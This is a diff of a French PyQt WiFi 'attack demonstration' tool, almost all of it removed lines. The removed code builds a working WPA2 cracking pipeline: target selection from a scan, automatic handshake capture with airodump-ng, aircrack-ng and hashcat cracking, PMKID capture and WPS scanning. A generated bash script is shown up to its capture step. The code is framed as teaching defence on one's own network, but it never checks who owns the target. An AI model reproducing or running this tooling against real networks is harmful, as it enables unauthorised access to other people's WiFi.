-        l1.addWidget(bs); lay.addWidget(f1)
-
-        # Étape 2 — test attaque
-        f2=CardF(GREEN); l2=QVBoxLayout(f2)
-        l2.setContentsMargins(14,12,14,14); l2.setSpacing(8)
-        l2.addWidget(TabPhase1._badge("2","Tester l'attaque (doit échouer)",GREEN))
-        l2.addWidget(HRule())
-        l2.addWidget(TipW(
-            "<b>Message clé :</b> MDP fort = aircrack tourne des "
-            "<b>millions d'années</b> sans résultat.","info"))
-        self._cap=Inp("Fichier .cap (laisser vide = auto-détect)")
-        self._wl=Inp("Wordlist","/usr/share/wordlists/rockyou.txt")
-        self._bssid2=Inp("BSSID (optionnel)")
-        r2a=QHBoxLayout(); r2a.setSpacing(6)
-        bf=Btn("🔍",ORANGE,sm=True); bf.setFixedWidth(34)
-        bf.clicked.connect(self._find_cap)
-        r2a.addWidget(self._cap,1); r2a.addWidget(bf)
-        r2b=QHBoxLayout(); r2b.setSpacing(6)
-        r2b.addWidget(Lbl("WL:",DIM,10)); r2b.addWidget(self._wl,1)
-        r2b.addWidget(Lbl("BSSID:",DIM,10)); r2b.addWidget(self._bssid2)
-        r2c=QHBoxLayout(); r2c.setSpacing(6)
-        bt=Btn("▶ Tester Dictionnaire (doit échouer)",ORANGE)
-        bx=Btn("■ Stop",RED,sm=True)
-        bt.clicked.connect(self._test); bx.clicked.connect(self._t.stop)
-        r2c.addWidget(bt); r2c.addWidget(bx); r2c.addStretch()
-        l2.addLayout(r2a); l2.addLayout(r2b); l2.addLayout(r2c)
-        lay.addWidget(f2)
-
-        # Étape 3 — stats
-        f3=CardF(GREEN); l3=QVBoxLayout(f3)
-        l3.setContentsMargins(14,12,14,14); l3.setSpacing(8)
-        l3.addWidget(TabPhase1._badge("3","Scanner le réseau sécurisé",GREEN))
-        l3.addWidget(HRule())
-        self._sub=Inp("Sous-réseau","192.168.43.0/24")
-        r3=QHBoxLayout(); r3.setSpacing(6)
-        ba=Btn("ARP Scan",CYAN,sm=True); bn=Btn("Nmap -sn",ORANGE,sm=True)
-        bv=Btn("nmap -sV 192.168.1.1",DIM,sm=True)
-        ba.clicked.connect(lambda: self._t.run(
-            f"sudo arp-scan {self._sub.text()} 2>&1"))
-        bn.clicked.connect(lambda: self._t.run(
-            f"nmap -sn {self._sub.text()} 2>&1"))
-        bv.clicked.connect(lambda: self._t.run("nmap -sV 192.168.1.1 2>&1"))
-        r3.addWidget(self._sub,1)
-        r3.addWidget(ba); r3.addWidget(bn); r3.addWidget(bv)
-        l3.addLayout(r3); lay.addWidget(f3)
-
-        self._t0=0
-        _ut=QTimer(self); _ut.start(1000)
-        lay.addStretch(); self.setWidget(w)
-
-    def _find_cap(self):
-        home=os.path.expanduser("~")
-        caps=sorted(
-            glob.glob(f"{home}/capture-*.cap")+
-            glob.glob(f"{home}/capture-*.pcap")+
-            glob.glob("/tmp/*.cap")+glob.glob("/tmp/*.pcap")+
-            glob.glob(f"{home}/*.cap"),
-            key=os.path.getmtime,reverse=True)
-        if caps:
-            self._cap.setText(caps[0])
-            self._t.note(f"→ .cap trouvé: {caps[0]}",GREEN)
-        else:
-            self._t.note("⚠ Aucun .cap — capturez d'abord un handshake (Phase1 → Étape 3)",ORANGE)
-
-    def _test(self):
-        cap=self._cap.text().strip()
-        wl=self._wl.text().strip() or "/usr/share/wordlists/rockyou.txt"
-        bssid=self._bssid2.text().strip()
-        home=os.path.expanduser("~")
-        if cap:
-            cap=os.path.expanduser(cap)
-        if not cap or not os.path.exists(cap):
-            # Auto-chercher
-            candidates=sorted(
-                glob.glob(f"{home}/capture-*.cap")+
-                glob.glob("/tmp/*.cap"),
-                key=os.path.getmtime,reverse=True)
-            cap=candidates[0] if candidates else f"{home}/capture-01.cap"
-            self._t.note(f"→ Utilisation automatique: {cap}",CYAN)
-        ba=f"-b {bssid}" if bssid else ""
-        self._t.run(f"aircrack-ng -w {wl} {ba} '{cap}' 2>&1")
-
-# ══════════════════════════════════════════════════════════════════
-#  THREAD CAPTURE PRÉPARATOIRE
-#  Lancé dès la sélection du réseau cible — crée capture-<BSSID>.cap
-#  en arrière-plan (airodump 60 s) et émet cap_path quand disponible
-# ══════════════════════════════════════════════════════════════════
-class CapturePrepThread(QThread):
-    cap_path  = pyqtSignal(str)   # chemin du .cap dès qu'il est créé
-    log_line  = pyqtSignal(str)   # messages de statut
-    finished  = pyqtSignal()
-
-    def __init__(self, bssid, chan, iface="wlan0mon"):
+    def __init__(self, cmd):
         super().__init__()
-        self.bssid = bssid
-        self.chan   = chan
-        self.iface  = iface
-        self._abort = False
-        home = os.path.expanduser("~")
-        safe = bssid.replace(":","")
-        self._cap_prefix = os.path.join(home, f"capture-{safe}")
-        self._cap_file   = ""
-
-    def cap_file(self):
-        return self._cap_file
-
-    def abort(self):
-        self._abort = True
-        try:
-            import signal as _sig
-            if self._proc:
-                os.killpg(os.getpgid(self._proc.pid), _sig.SIGTERM)
-        except Exception:
-            pass
+        self.cmd = cmd
+        self._raw = ""
 
     def run(self):
-        import signal as _sig
-        home = os.path.expanduser("~")
-        # ── Nettoyage fichiers précédents pour ce BSSID ──
-        for old in glob.glob(f"{self._cap_prefix}-*.cap") + \
-                   glob.glob(f"{self._cap_prefix}-*.csv") + \
-                   glob.glob(f"{self._cap_prefix}-*.kismet.*") + \
-                   glob.glob(f"{self._cap_prefix}-*.log.csv"):
-            try: os.remove(old)
-            except Exception: pass
-
-        cmd = (f"sudo airodump-ng --bssid {self.bssid} -c {self.chan} "
-               f"-w {self._cap_prefix} --output-format pcap "
-               f"{self.iface}")
-        self.log_line.emit(f"⚡ Capture préparatoire → {self.iface}  "
-                           f"BSSID={self.bssid}  CH={self.chan}")
-        self.log_line.emit(f"📁 Sortie : {self._cap_prefix}-01.cap")
         try:
-            env = os.environ.copy(); env["TERM"]="dumb"; env["NO_COLOR"]="1"
-            self._proc = subprocess.Popen(
-                cmd, shell=True, executable="/bin/bash",
+            proc = subprocess.Popen(
+                self.cmd, shell=True,
                 stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
-                text=True, bufsize=1, env=env,
-                preexec_fn=os.setsid)
-            deadline = 60          # secondes max
-            elapsed  = 0
-            while not self._abort and elapsed < deadline:
-                # Chercher le fichier .cap créé par airodump-ng
-                caps = sorted(glob.glob(f"{self._cap_prefix}-*.cap"),
-                              key=os.path.getmtime, reverse=True)
-                if caps and os.path.getsize(caps[0]) > 24:
-                    self._cap_file = caps[0]
-                    self.cap_path.emit(self._cap_file)
-                    self.log_line.emit(
-                        f"✅ Fichier créé : {os.path.basename(self._cap_file)}")
-                    break
-                self.msleep(1000); elapsed += 1
-                if elapsed % 5 == 0:
-                    self.log_line.emit(f"  ⏳ {elapsed}s — création capture…")
-            try:
-                os.killpg(os.getpgid(self._proc.pid), _sig.SIGTERM)
-            except Exception:
-                pass
-            self._proc.wait()
+                text=True, bufsize=1
+            )
+            for line in iter(proc.stdout.readline, ''):
+                if line.strip():
+                    self._raw += line
+                    self.output.emit(strip_ansi(line).rstrip())
+            proc.wait()
+            # Tenter parse nmcli d'abord, sinon airodump
+            nets = parse_nmcli_columns(self._raw)
+            if not nets:
+                nets = parse_airodump(self._raw)
+            self.result.emit(nets)
         except Exception as e:
-            self.log_line.emit(f"⚠ CapturePrepThread : {e}")
-        self.finished.emit()
+            self.output.emit(f"Erreur : {e}")
+            self.result.emit([])
 
-# ══════════════════════════════════════════════════════════════════
-#  ONGLET ATTAQUES
-# ══════════════════════════════════════════════════════════════════
-class TabAttacks(QWidget):
-    _M=[("dict","📖 Dictionnaire",RED,"⚡ RAPIDE — si MDP faible"),
-        ("brute","🔨 Brute Force",DIM,"🐢 LENT — garanti"),
-        ("hybrid","🔀 Hybride/Règles",ORANGE,"⚡ MOYEN — réaliste"),
-        ("wps","📶 WPS PIN",RED,"⚡ RAPIDE — si WPS actif"),
-        ("pmkid","🔑 PMKID",RED,"⚡ Sans client connecté"),
-        ("social","🎭 Social Engineering",ORANGE,"⚡ Humain > technique")]
-    _D={
-        "dict":dict(tip_k="warn",
-            tip="<b>Principe :</b> Tester des millions de mots courants.<br>"
-                "rockyou.txt = 14 millions. <code>password</code> → instantané. "
-                "<code>X#9kL!mP3@</code> → jamais.",
-            opts=[("Fichier .cap:","cap","~/capture-01.cap"),
-                  ("Wordlist:","wl","/usr/share/wordlists/rockyou.txt"),
-                  ("BSSID (-b):","bssid","")],
-            cmd=None,  # géré par _run_dict
-            run_fn="dict"),
-        "brute":dict(tip_k="info",
-            tip="<b>Toutes les combinaisons :</b> "
-                "8 chars alphanum = 218 milliards. GPU 500k/s = 5 jours.<br>"
-                "12 chars aléatoires → des milliers d'années.",
-            opts=[("Hash .hc22000:","hc","/tmp/hash.hc22000"),
-                  ("Masque hashcat:","mask","?d?d?d?d?d?d?d?d")],
-            cmd=lambda o: f"hashcat -m 22000 {o['hc']} -a 3 {o['mask']} --status 2>&1"),
-        "hybrid":dict(tip_k="warn",
-            tip="<b>Transformations :</b> <code>password→P@ssw0rd</code>, "
-                "<code>admin→@dmin1</code><br>"
-                "Très efficace: les humains modifient toujours pareil.",
-            opts=[("Hash:","hc","/tmp/hash.hc22000"),
-                  ("Wordlist:","wl","/usr/share/wordlists/rockyou.txt")],
-            cmd=lambda o: f"hashcat -m 22000 {o['hc']} {o['wl']} "
-                          f"-r /usr/share/hashcat/rules/best64.rule --status 2>&1"),
-        "wps":dict(tip_k="danger",
-            tip="<b>Faille WPS :</b> PIN 8 chiffres vérifié en 2 parties = max 11 000 essais.<br>"
-                "Pixie Dust: quelques secondes sur certains routeurs.<br>"
-                "Activé par défaut sur la plupart des routeurs grand public.",
-            opts=[("Interface:","iface","wlan0mon"),("Durée(s):","dur","30")],
-            cmd=lambda o: f"sudo timeout {o['dur']} wash -i {o['iface']} -s 2>&1"),
-        "pmkid":dict(tip_k="danger",
-            tip="<b>Technique 2018 :</b> Aucun client connecté requis.<br>"
-                "L'AP envoie le PMKID dans le 1er paquet EAPOL.<br>"
-                "Capture en secondes → crackage hors ligne avec hashcat.",
-            opts=[("Interface:","iface","wlan0mon"),("Durée(s):","dur","20")],
-            cmd=lambda o: f"sudo timeout {o['dur']} hcxdumptool "
-                          f"-i {o['iface']} -o /tmp/pmkid.pcapng "
-                          f"--enable_status=1 2>&1"),
-        "social":dict(tip_k="warn",
-            tip="<b>Tromper l'humain :</b> Evil Twin AP, faux portail captif, "
-                "usurpation de technicien.",
-            tip2_k="danger",
-            tip2="<b>85% des incidents</b> impliquent l'humain. "
-                 "Aucun MDP fort ne protège contre quelqu'un qui le donne.",
-            tip3_k="success",
-            tip3="<b>Défense :</b> Formation, sensibilisation, "
-                 "ne jamais donner le MDP à un inconnu.",
-            opts=[],cmd=None),
-    }
 
-    def __init__(self,term:Terminal):
-        super().__init__(); self._t=term; self._opts={}
-        self._nets=[]
-        self._cap_thread = None          # ← thread capture préparatoire
-        self._current_cap = ""           # ← chemin du .cap actif
-        # ← rafraîchir le champ cap automatiquement après chaque capture
-        self._t.cap_ready.connect(self._on_cap_ready)
-        lay=QVBoxLayout(self); lay.setContentsMargins(14,14,14,14); lay.setSpacing(10)
-        lay.addWidget(Lbl("Méthodes d'Attaque WiFi",WHITE,19,True))
-        lay.addWidget(Lbl("Comprendre pour mieux défendre — sur votre réseau uniquement",DIM,10))
-        lay.addWidget(HRule())
-
-        # ── Sélecteur de réseau cible ───────────────────────────────
-        tg=QFrame()
-        tg.setStyleSheet(
-            f"QFrame{{background:{BG2};border:1px solid {ORANGE}44;"
-            f"border-radius:4px;}}")
-        tgl=QVBoxLayout(tg); tgl.setContentsMargins(12,10,12,10); tgl.setSpacing(6)
-        tgl.addWidget(Lbl("🎯  RÉSEAU CIBLE",ORANGE,10))
-        tgl.addWidget(HRule())
-
-        row_sel=QHBoxLayout(); row_sel.setSpacing(8)
-        self._net_combo=QComboBox()
-        self._net_combo.setMinimumWidth(420)
-        self._net_combo.setStyleSheet(f"""
-            QComboBox{{background:{BG};border:1px solid {ORANGE}66;color:{WHITE};
-              padding:7px 10px;border-radius:3px;font-size:11px;
-              font-family:"JetBrains Mono",monospace;}}
-            QComboBox:focus{{border-color:{ORANGE};}}
-            QComboBox::drop-down{{border:none;width:22px;}}
-            QComboBox QAbstractItemView{{background:{PANEL};border:1px solid {B2};
-              color:{TEXT};selection-background-color:{B1};font-size:11px;
-              font-family:"JetBrains Mono",monospace;}}""")
-        self._net_combo.addItem("— Aucun réseau  (lancez d'abord un scan WiFi) —")
-        self._net_combo.currentIndexChanged.connect(self._on_net_selected)
-
-        btn_scan=Btn("🔍 Scanner",CYAN,sm=True)
-        btn_scan.clicked.connect(lambda: self._t.run(nm_fix_wrap(
-            "nmcli -f SSID,BSSID,SIGNAL,CHAN,RATE,SECURITY dev wifi list 2>&1")))
-        row_sel.addWidget(self._net_combo,1)
-        row_sel.addWidget(btn_scan)
-        tgl.addLayout(row_sel)
-
-        # Infos du réseau sélectionné
-        row_info=QHBoxLayout(); row_info.setSpacing(16)
-        self._lbl_ssid  =Lbl("SSID: —",DIM,10)
-        self._lbl_bssid =Lbl("BSSID: —",DIM,10)
-        self._lbl_sec   =Lbl("Sécu: —",DIM,10)
-        self._lbl_chan   =Lbl("Canal: —",DIM,10)
-        self._lbl_cap   =Lbl("Cap: —",DIM,10)
-        for lb in [self._lbl_ssid,self._lbl_bssid,self._lbl_sec,
-                   self._lbl_chan,self._lbl_cap]:
-            row_info.addWidget(lb)
-        row_info.addStretch()
-        tgl.addLayout(row_info)
-
-        # ── Barre statut capture préparatoire ──────────────────────
-        self._cap_status = Lbl(
-            "⏳ Sélectionnez un réseau → capture.cap sera créé automatiquement",
-            DIM, 10)
-        self._cap_status.setStyleSheet(
-            f"color:{DIM};font-size:10px;background:rgba(0,0,0,0);"
-            f"border:1px solid {B1};border-radius:3px;padding:4px 8px;")
-        tgl.addWidget(self._cap_status)
-        lay.addWidget(tg)
-
-        # ── Grille méthodes ────────────────────────────────────────
-        grid=QGridLayout(); grid.setSpacing(8)
-        for i,(key,name,col,speed) in enumerate(self._M):
-            b=QPushButton(f"{name}\n{speed}")
-            b.setStyleSheet(f"""
-                QPushButton{{background:{BG2};border:1px solid {B2};color:{TEXT};
-                  padding:12px;border-radius:3px;text-align:left;font-size:11px;}}
-                QPushButton:hover{{border-color:{col};background:{PANEL};}}""")
-            b.clicked.connect(lambda _,k=key: self._show(k))
-            grid.addWidget(b,i//2,i%2)
-        lay.addLayout(grid)
-
-        self._df=CardF(); self._dl=QVBoxLayout(self._df)
-        self._dl.setContentsMargins(14,12,14,14); self._dl.setSpacing(8)
-        self._dl.addWidget(Lbl("← Cliquez sur une méthode",DIM,10))
-        lay.addWidget(self._df)
-
-        # Message clé
-        km=QFrame(); km.setStyleSheet(
-            f"QFrame{{background:rgba(0,212,255,.06);"
-            f"border:1px solid rgba(0,212,255,.22);border-radius:4px;}}")
-        kl=QVBoxLayout(km); kl.setContentsMargins(14,12,14,12); kl.setSpacing(5)
-        kl.addWidget(Lbl("👉 Message Clé",WHITE,13,True))
-        for txt in [
-            "WPA2/WPA3 + MDP 16+ chars = base minimum obligatoire",
-            "Désactiver WPS dans le routeur — faille critique incontournable",
-            "MDP faible: cracké en secondes  |  MDP fort: milliards d'années",
-            "Social engineering contourne toute la sécurité technique"]:
-            r=QHBoxLayout(); r.setSpacing(8)
-            r.addWidget(Lbl("▶",CYAN,10)); r.addWidget(Lbl(txt,TEXT,11),1)
-            kl.addLayout(r)
-        lay.addWidget(km)
-
-    def set_nets(self,nets):
-        """Appelé par MainWin quand un scan retourne des réseaux."""
-        self._nets=nets
-        prev=self._net_combo.currentIndex()
-        self._net_combo.blockSignals(True)
-        self._net_combo.clear()
-        self._net_combo.addItem("— Sélectionner le réseau cible —")
-        for n in nets:
-            ssid  =n.get("ssid","<hidden>")
-            bssid =n.get("bssid","?")
-            sig   =n.get("signal","?")
-            sec   =n.get("security","?")
-            chan  =n.get("channel","?")
-            rate  =n.get("rate","?")
-            label=f"{ssid:<18}  {bssid}   sig:{sig}%  ch:{chan}  {rate}  {sec}"
-            self._net_combo.addItem(label)
-        self._net_combo.blockSignals(False)
-        # Restaurer sélection si possible
-        if prev>0 and prev<self._net_combo.count():
-            self._net_combo.setCurrentIndex(prev)
-        else:
-            self._net_combo.setCurrentIndex(0)
-
-    def _on_net_selected(self,idx):
-        """Dès la sélection d'un réseau : lance la capture préparatoire
-        et met à jour les 2 champs Cap / Fichier .cap en temps réel."""
-        # ── Annuler toute capture précédente ───────────────────────
-        if self._cap_thread and self._cap_thread.isRunning():
-            self._cap_thread.abort()
-            self._cap_thread.wait(800)
-
-        if idx<=0 or idx-1>=len(self._nets):
-            for lb in [self._lbl_ssid,self._lbl_bssid,self._lbl_sec,
-                       self._lbl_chan,self._lbl_cap]:
-                lb.setText(lb.text().split(":")[0]+": —")
-                lb.setStyleSheet(f"color:{DIM};font-size:10px;background:transparent;")
-            self._cap_status.setText(
-                "⏳ Sélectionnez un réseau → capture.cap sera créé automatiquement")
-            self._cap_status.setStyleSheet(
-                f"color:{DIM};font-size:10px;background:rgba(0,0,0,0);"
-                f"border:1px solid {B1};border-radius:3px;padding:4px 8px;")
-            return
-
-        n    = self._nets[idx-1]
-        ssid = n.get("ssid","<hidden>")
-        bssid= n.get("bssid","?")
-        sec  = n.get("security","?")
-        chan  = str(n.get("channel","6"))
-        s    = sec.lower()
-        sc   = CYAN if "wpa3" in s else GREEN if "wpa2" in s else ORANGE if "wpa" in s else RED
-
-        # ── Nom du futur fichier (avant création) ──────────────────
-        home     = os.path.expanduser("~")
-        safe     = bssid.replace(":","")
-        cap_future = os.path.join(home, f"capture-{safe}-01.cap")
-
-        # ── Mise à jour labels info réseau ─────────────────────────
-        self._lbl_ssid .setText(f"SSID: {ssid}")
-        self._lbl_bssid.setText(f"BSSID: {bssid}")
-        self._lbl_sec  .setText(f"Sécu: {sec}")
-        self._lbl_chan  .setText(f"Canal: {chan}")
-        self._lbl_cap  .setText(f"Cap: capture-{safe}-01.cap ⚡")
-        for lb,col in [(self._lbl_ssid,WHITE),(self._lbl_bssid,CYAN),
-                       (self._lbl_sec,sc),(self._lbl_chan,ORANGE),
-                       (self._lbl_cap,ORANGE)]:
-            lb.setStyleSheet(
-                f"color:{col};font-size:10px;font-weight:bold;background:transparent;")
-
-        # ── Pré-remplir les 2 champs BSSID + cap immédiatement ────
-        if "bssid" in self._opts:
-            self._opts["bssid"].setText(bssid)
-        self._set_cap_fields(cap_future)   # chemin futur (pas encore créé)
-
-        # ── Barre statut : en cours ────────────────────────────────
-        self._cap_status.setText(
-            f"⚡ Création automatique capture-{safe}-01.cap en cours…  "
-            f"BSSID={bssid}  CH={chan}")
-        self._cap_status.setStyleSheet(
-            f"color:{ORANGE};font-size:10px;font-weight:bold;"
-            f"background:rgba(255,140,0,.07);"
-            f"border:1px solid {ORANGE}55;border-radius:3px;padding:4px 8px;")
-
-        # ── Lancer le thread de capture préparatoire ───────────────
-        self._cap_thread = CapturePrepThread(bssid, chan)
-        self._cap_thread.cap_path .connect(self._on_cap_created)
-        self._cap_thread.log_line .connect(lambda m: self._t.note(m, CYAN))
-        self._cap_thread.finished .connect(self._on_cap_thread_done)
-        self._cap_thread.start()
-
-    def _set_cap_fields(self, path):
-        """Met à jour le champ 'Fichier .cap:' ET le label 'Cap:' en même temps."""
-        self._current_cap = path
-        if "cap" in self._opts:
-            self._opts["cap"].setText(path)
-        name   = os.path.basename(path)
-        exists = os.path.exists(path)
-        col    = GREEN if exists else ORANGE
-        tag    = "✅" if exists else "⚡ AUTO"
-        self._lbl_cap.setText(f"Cap: {name} {tag}")
-        self._lbl_cap.setStyleSheet(
-            f"color:{col};font-size:10px;font-weight:bold;background:transparent;")
-
-    def _on_cap_created(self, path):
-        """Appelé par CapturePrepThread dès que le fichier .cap est créé sur disque."""
-        self._set_cap_fields(path)
-        name = os.path.basename(path)
-        self._cap_status.setText(f"✅ {name} prêt — cliquez ▶ LANCER DÉMONSTRATION")
-        self._cap_status.setStyleSheet(
-            f"color:{GREEN};font-size:10px;font-weight:bold;"
-            f"background:rgba(0,255,136,.07);"
-            f"border:1px solid {GREEN}55;border-radius:3px;padding:4px 8px;")
-        self._t.note(f"✅ capture prêt → {name}", GREEN)
-
-    def _on_cap_thread_done(self):
-        """Appelé quand le thread termine (timeout ou abort)."""
-        if not self._current_cap or not os.path.exists(self._current_cap):
-            self._cap_status.setText(
-                "⚠ Capture terminée sans fichier — vérifiez wlan0mon (Phase1 → Étape 1)")
-            self._cap_status.setStyleSheet(
-                f"color:{RED};font-size:10px;font-weight:bold;"
-                f"background:rgba(255,32,80,.07);"
-                f"border:1px solid {RED}55;border-radius:3px;padding:4px 8px;")
-
-    def _current_net(self):
-        """Retourne le réseau sélectionné ou None."""
-        idx=self._net_combo.currentIndex()
-        if idx<=0 or idx-1>=len(self._nets): return None
-        return self._nets[idx-1]
-
-    def _best_cap(self):
-        """
-        Retourne le meilleur fichier .cap à utiliser :
-        - Priorité 1 : fichier avec handshake WPA (le plus récent)
-        - Priorité 2 : n'importe quel .cap récent
-        - Priorité 3 : chemin du futur fichier auto (pas encore créé)
-        Met aussi à jour le label _lbl_cap dans la barre infos.
-        """
-        home = os.path.expanduser("~")
-        cap_prefix = os.path.join(home, "capture")
-        candidates = sorted(
-            glob.glob(f"{home}/capture-*.cap") +
-            glob.glob(f"{home}/capture-*.pcap") +
-            glob.glob("/tmp/*.cap"),
-            key=os.path.getmtime, reverse=True)
-        # Chercher un fichier avec handshake
-        for c in candidates:
-            try:
-                r = subprocess.run(
-                    f"aircrack-ng '{c}' 2>&1 | grep -i 'WPA handshake'",
-                    shell=True, capture_output=True, text=True, timeout=6)
-                if r.stdout.strip():
-                    return c  # ✅ handshake confirmé
-            except Exception:
-                pass
-        # Sinon premier .cap existant
-        if candidates:
-            return candidates[0]
-        # Sinon chemin futur du pipeline auto
-        return f"{cap_prefix}-auto-01.cap"
-
-    def _refresh_cap_field(self):
-        """Rafraîchit le champ cap avec le meilleur fichier disponible (bouton 🔄)."""
-        best = self._current_cap if (self._current_cap and os.path.exists(self._current_cap)) \
-               else self._best_cap()
-        self._set_cap_fields(best)
-
-    def _show(self,key):
-        d=self._D.get(key,{}); self._opts={}
-        while self._dl.count():
-            it=self._dl.takeAt(0)
-            if it.widget(): it.widget().deleteLater()
-        names={m[0]:m[1] for m in self._M}
-        self._dl.addWidget(Lbl(names.get(key,""),WHITE,13,True))
-        self._dl.addWidget(HRule())
-        self._dl.addWidget(TipW(d.get("tip",""),d.get("tip_k","info")))
-        if "tip2" in d: self._dl.addWidget(TipW(d["tip2"],d.get("tip2_k","warn")))
-        if "tip3" in d: self._dl.addWidget(TipW(d["tip3"],d.get("tip3_k","success")))
-
-        # ── Valeurs auto depuis réseau sélectionné ─────────────────
-        net        = self._current_net()
-        bssid_auto = net.get("bssid","") if net else ""
-        # Priorité : fichier du thread préparatoire > meilleur existant
-        cap_auto   = self._current_cap if self._current_cap else self._best_cap()
-
-        for (lbl_txt,var,default) in d.get("opts",[]):
-            r=QHBoxLayout(); r.setSpacing(6)
-            r.addWidget(Lbl(lbl_txt,DIM,10))
-            if var=="bssid" and bssid_auto:
-                val=bssid_auto
-            elif var=="cap":
-                val=cap_auto
-            else:
-                val=default
-            f=Inp(lbl_txt,val); self._opts[var]=f
-            # Bouton 🔄 à côté du champ cap pour rafraîchir
-            if var=="cap":
-                br2=QPushButton("🔄"); br2.setFixedSize(26,26)
-                br2.setToolTip("Rafraîchir — cherche le fichier .cap le plus récent")
-                br2.setStyleSheet(
-                    f"QPushButton{{background:{B1};border:1px solid {B2};"
-                    f"color:{CYAN};border-radius:3px;font-size:11px;padding:0;}}"
-                    f"QPushButton:hover{{border-color:{CYAN};background:{B2};}}")
-                br2.clicked.connect(self._refresh_cap_field)
-                r.addWidget(f,1); r.addWidget(br2)
-            else:
-                r.addWidget(f,1)
-            self._dl.addLayout(r)
-
-        # ── Indicateur statut du fichier cap ──────────────────────
-        if "cap" in self._opts:
-            exists = os.path.exists(cap_auto)
-            col    = GREEN if exists else ORANGE
-            tag    = "✅ Handshake prêt" if exists else "⚡ Sera créé automatiquement au lancement"
-            tip_cap= TipW(
-                f"<b>Fichier capture :</b> <code>{os.path.basename(cap_auto)}</code><br>"
-                f"{tag}",
-                "success" if exists else "warn")
-            self._dl.addWidget(tip_cap)
-
-        if d.get("cmd") is not None or d.get("run_fn"):
-            r=QHBoxLayout(); r.setSpacing(6)
-            br=Btn("▶  LANCER DÉMONSTRATION",CYAN)
-            bx=Btn("■ Stop",RED,sm=True)
-            br.clicked.connect(lambda _,k=key: self._run(k))
-            bx.clicked.connect(self._t.stop)
-            r.addWidget(br); r.addWidget(bx); r.addStretch()
-            self._dl.addLayout(r)
-
-    def _run_dict(self, opts):
-        """Pipeline complet 5 etapes : moniteur -> scan -> capture -> deauth -> aircrack."""
-        import tempfile, stat
-
-        wl    = opts.get("wl", "/usr/share/wordlists/rockyou.txt").strip()
-        bssid = opts.get("bssid", "").strip()
-        home  = os.path.expanduser("~")
-
-        # Recuperer infos reseau selectionne
-        net   = self._current_net()
-        if not bssid and net:
-            bssid = net.get("bssid", "").strip()
-        chan  = str(net.get("channel", "6")).strip() if net else "6"
-
-        if not bssid:
-            self._t.note("BSSID manquant -- selectionnez un reseau cible", RED)
-            self._t.note("Cliquez Scanner puis choisissez votre reseau", ORANGE)
-            return
-
-        safe     = bssid.replace(":", "")
-        cap_out  = os.path.join(home, f"capture-{safe}")
-        cap_final = f"{cap_out}-01.cap"
-
-        # Chercher handshake existant
-        existing_cap = ""
-        candidates = sorted(
-            glob.glob(f"{home}/capture-*.cap") +
-            glob.glob(f"{home}/capture-*.pcap") +
-            glob.glob("/tmp/*.cap"),
-            key=os.path.getmtime, reverse=True)
-        for c in candidates:
-            try:
-                r = subprocess.run(
-                    ["aircrack-ng", c],
-                    capture_output=True, text=True, timeout=8)
-                if "WPA handshake" in r.stdout or "WPA handshake" in r.stderr:
-                    existing_cap = c
-                    break
-            except Exception:
-                pass
-
-        self._t.note("== DEMONSTRATION ATTAQUE WPA2 - PIPELINE COMPLET ==", CYAN)
-
-        if existing_cap:
-            self._set_cap_fields(existing_cap)
-            self._t.note(f"Handshake existant : {os.path.basename(existing_cap)}", GREEN)
-            self._t.note("Etapes 1-4 ignorees -- lancement crack direct", GREEN)
-            # Script minimal pour le cas handshake existant
-            script = (
-                "#!/bin/bash\n"
-                "set -e\n"
-                f'CAP="{existing_cap}"\n'
-                f'WL="{wl}"\n'
-                f'BSSID="{bssid}"\n'
-                'echo ""\n'
-                'echo "--- ETAPE 5/5 : Crack dictionnaire ---"\n'
-                f'echo "  Fichier  : $CAP"\n'
-                f'echo "  Wordlist : $WL"\n'
-                f'echo "  BSSID    : $BSSID"\n'
-                f'echo "  Commande : aircrack-ng -w $WL -b $BSSID $CAP"\n'
-                'echo ""\n'
-                f'aircrack-ng -w "$WL" -b "$BSSID" "$CAP" 2>&1\n'
-                'echo ""\n'
-                'echo "--- FIN ---"\n'
-                'echo "KEY FOUND    -> MDP faible, changez-le !"\n'
-                'echo "KEY NOT FOUND -> MDP robuste ou WPA3."\n'
-            )
-        else:
-            self._set_cap_fields(cap_final)
-            self._t.note(f"Fichier cible : {cap_final}", CYAN)
-            # Script complet 5 etapes
-            script = (
-                "#!/bin/bash\n"
-                "\n"
-                f'BSSID="{bssid}"\n'
-                f'CHAN="{chan}"\n'
-                f'WL="{wl}"\n'
-                f'CAP_OUT="{cap_out}"\n'
-                f'CAP_FINAL="{cap_final}"\n'
-                'IFACE="wlan0mon"\n'
-                "\n"
-
-                # ETAPE 1
-                'echo ""\n'
-                'echo "=== ETAPE 1/5 : Mode moniteur ==="\n'
-                'echo "  sudo airmon-ng start wlan0"\n'
-                'echo ""\n'
-                'if iw dev wlan0mon info >/dev/null 2>&1; then\n'
-                '  echo "OK wlan0mon deja actif"\n'
-                'else\n'
-                '  sudo airmon-ng check kill 2>&1 | grep -v "^$" || true\n'
-                '  sudo airmon-ng start wlan0 2>&1\n'
-                '  sleep 2\n'
-                '  if iw dev wlan0mon info >/dev/null 2>&1; then\n'
-                '    echo "OK wlan0mon actif"\n'
-                '  else\n'
-                '    echo "ERREUR : impossible activer wlan0mon"\n'
-                '    echo "  -> Verifiez que la carte supporte le mode moniteur"\n'
-                '    exit 1\n'
-                '  fi\n'
-                'fi\n'
-                "\n"
-
-                # ETAPE 2
-                'echo ""\n'
-                'echo "=== ETAPE 2/5 : Scan de confirmation (5s) ==="\n'
-                'echo "  sudo airodump-ng wlan0mon"\n'
-                'echo ""\n'
-                f'sudo timeout 5 airodump-ng wlan0mon 2>&1 | grep -E "BSSID|{bssid}" | head -5 || true\n'
-                f'echo "  Reseau cible : BSSID={bssid}  Canal={chan}"\n'
-                "\n"
-
-                # ETAPE 3
-                'echo ""\n'
-                'echo "=== ETAPE 3/5 : Capture ciblee (creation fichier .cap) ==="\n'
-                f'echo "  sudo airodump-ng -c {chan} --bssid {bssid} -w capture-{safe} wlan0mon"\n'
-                'echo ""\n'
-                # Nettoyage
-                'rm -f "${CAP_OUT}"-*.cap "${CAP_OUT}"-*.csv "${CAP_OUT}"-*.kismet.* "${CAP_OUT}"-*.log.csv 2>/dev/null || true\n'
-                # Lancement airodump en BG
-                'sudo timeout 90 airodump-ng \\\n'
-                '  -c "$CHAN" --bssid "$BSSID" \\\n'
-                '  -w "$CAP_OUT" --output-format pcap \\\n'
-                '  "$IFACE" >/tmp/_airodump_demo.log 2>&1 &\n'
-                'DUMP_PID=$!\n'
-                'echo "  airodump-ng lance (PID=$DUMP_PID)"\n'
-                f'echo "  Fichier cible : {cap_final}"\n'
-                'sleep 4\n'
